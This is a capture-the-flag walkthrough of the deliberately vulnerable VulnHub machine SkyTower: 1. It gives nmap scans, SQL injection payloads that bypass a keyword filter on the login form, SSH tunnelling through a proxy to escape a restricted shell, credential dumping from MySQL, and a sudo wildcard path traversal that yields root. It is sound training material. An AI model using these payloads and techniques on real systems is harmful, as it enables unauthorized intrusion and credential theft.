# SkyTower: 1

- **Machine:** SkyTower: 1
- **Download:** https://www.vulnhub.com/entry/skytower-1,96/

![](845-1.png)

---

# Machine Setup

1. Extract the downloaded archive.
2. Create a new VirtualBox virtual machine.
3. Set the following configuration:
   - **Name:** SkyTower
   - **Type:** Linux
   - **Version:** Other Linux (64-bit)
4. Remove the default virtual hard disk.
5. Attach the provided **.vdi** file to the SATA Controller.
6. Start the virtual machine.

---

# Network Scanning

## Discover the Target IP

```bash
nmap -sn 192.168.2.0/24
```

![](845-2.png)

---

## Full Nmap Scan

Perform a complete scan to identify open ports, services, operating system details, and default NSE scripts.

```bash
nmap -v -Pn -sT -sV -sC -A -O -p- 192.168.2.182
```

![](845-3.png)

---

## Optional Port Enumeration

```bash
nmap -v -p- 192.168.2.182
```

```bash
nmap -sC -sV -A 192.168.2.182
```

---

## HTTP Enumeration

Run the HTTP enumeration NSE script.

```bash
nmap -v -p 80 -sT -sV -A --script=http-enum.nse 192.168.2.182
```

![](845-4.png)

---

# Web Enumeration

Visit the target website.

```text
http://192.168.2.182
```

![](845-5.png)

A login page is presented. Since no credentials are available, test the login form for SQL injection.

---

## Initial SQL Injection Test

Inject a single quote to identify input validation.

```text
'
```

![](845-6.png)

![](845-7.png)

The application returns a database error, confirming that the input reaches the SQL query.

---

## Authentication Bypass

A traditional payload such as:

```text
' or 1=1 #
```

is filtered by the application.

![](845-8.png)

![](845-9.png)

The filter blocks keywords such as **OR** and the **=** operator.

Instead, use an alternative logical operator to bypass the filter.

```text
' || 1=1#
```

or

```text
' OORR 1=1#
```

![](845-10.png)

![](845-11.png)

Authentication succeeds, revealing valid credentials.

```text
Email    : john@skytech.com
Username : john
Password : hereisjohn
```

**Note:** Although valid credentials were obtained, SSH is not directly accessible.

---

# Pivoting to SSH

The SSH service is only reachable through the HTTP proxy running on port **3128**.

Install the required tools.

```bash
sudo apt install proxychains corkscrew -y
```

Use **Corkscrew** to tunnel SSH through the proxy.

```bash
ssh -o ProxyCommand="corkscrew 192.168.2.182 3128 %h %p" -t john@192.168.2.182 "bash --noprofile --norc"
```

The `--noprofile --norc` options bypass the restricted shell initialization files.

![](845-12.png)

The `john` account has no useful sudo privileges.

---

# Privilege Escalation

## Recover Database Credentials

Inspect the web application's login script.

```bash
cat /var/www/login.php
```

![](845-13.png)

Recovered MySQL credentials:

```text
Username : root
Password : root
```

---

## MySQL Enumeration

Connect to MySQL.

```bash
mysql -u root -proot
```

Enumerate the database.

```sql
SHOW DATABASES;
```

```sql
USE SkyTech;
```

```sql
SHOW TABLES;
```

Dump the login table.

```sql
SELECT * FROM login;
```

![](845-14.png)

Recovered credentials:

| Email | Password |
|--------|----------|
| john@skytech.com | hereisjohn |
| sara@skytech.com | ihatethisjob |
| william@skytech.com | senseable |

---

## Login as Sara

Reconnect using the recovered credentials.

```bash
ssh -o ProxyCommand="corkscrew 192.168.2.182 3128 %h %p" -t sara@192.168.2.182 "bash --noprofile --norc"
```

![](845-15.png)

This account has sudo privileges.

---

## Sudo Misconfiguration

List the accessible directory.

```bash
sudo ls /accounts/
```

The sudo rule allows `cat` and `ls` on `/accounts/*`.

Because wildcard expansion does not properly restrict path traversal, escape the directory using `..`.

```bash
sudo cat /accounts/../root/flag.txt
```

![](845-16.png)

The traversal resolves to:

```text
/accounts/../root/
```

allowing access to files inside the root user's home directory.

Recovered credential:

```text
Root Password : theskytower
```

---

## Root Access

Authenticate directly as root.

```bash
ssh -o ProxyCommand="corkscrew 192.168.2.182 3128 %h %p" -t root@192.168.2.182 "bash --noprofile --norc"
```

![](845-17.png)

---

# Vulnerability Summary

| No. | Vulnerability | Impact |
|-----|---------------|--------|
| 1 | SQL Injection in login form | Authentication bypass and credential disclosure |
| 2 | SSH accessible through HTTP proxy | Internal service access using Corkscrew |
| 3 | Restricted shell | Bypassed using `--noprofile --norc` |
| 4 | MySQL root account with default password | Full database compromise |
| 5 | Sudo wildcard path traversal | Root privilege escalation |

---

# Key Learning

- SQL injection can still succeed even when common keywords are filtered.
- Alternative operators can sometimes bypass weak input filtering.
- Internal services may be reachable through HTTP proxies using tools such as **Corkscrew**.
- Always inspect application source code for hardcoded database credentials.
- Default database passwords remain a common security weakness.
- Wildcards in sudo rules can introduce path traversal vulnerabilities and lead to full privilege escalation.

---

# Summary

The assessment began with Nmap enumeration, revealing a web application protected by an HTTP proxy. SQL injection in the login form bypassed authentication despite keyword filtering, exposing valid user credentials. SSH access was achieved by tunneling through the proxy using **Corkscrew**, and local enumeration revealed MySQL root credentials stored in the web application. Additional user credentials were extracted from the database, allowing access as **sara**, whose sudo permissions contained a wildcard path traversal vulnerability. Exploiting this misconfiguration disclosed the root password, ultimately resulting in full administrative access to the system.